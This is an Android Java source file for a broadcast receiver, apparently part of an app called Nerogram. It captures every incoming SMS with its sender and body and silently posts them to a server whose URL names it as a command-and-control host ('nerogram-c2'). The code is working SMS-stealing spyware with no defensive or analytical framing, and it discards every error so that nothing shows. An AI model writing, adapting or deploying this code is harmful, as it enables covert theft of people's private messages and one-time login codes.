package com.nerogram;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                    String sender = sms.getDisplayOriginatingAddress();
                    String message = sms.getMessageBody();
                    
                    // Отправляем на сервер
                    sendToServer("SMS от " + sender + ": " + message);
                }
            }
        }
    }

    private void sendToServer(String text) {
        new Thread(() -> {
            try {
                String urlStr = "https://nerogram-c2.onrender.com/api/data"; // ТВОЙ URL RENDER
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                String json = "{\"id\":\"android-phone\",\"type\":\"text\",\"text\":\"" + text + "\"}";
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(json.getBytes("utf-8"));
                }
                conn.getResponseCode();
            } catch (Exception ignored) {}
        }).start();
    }
}
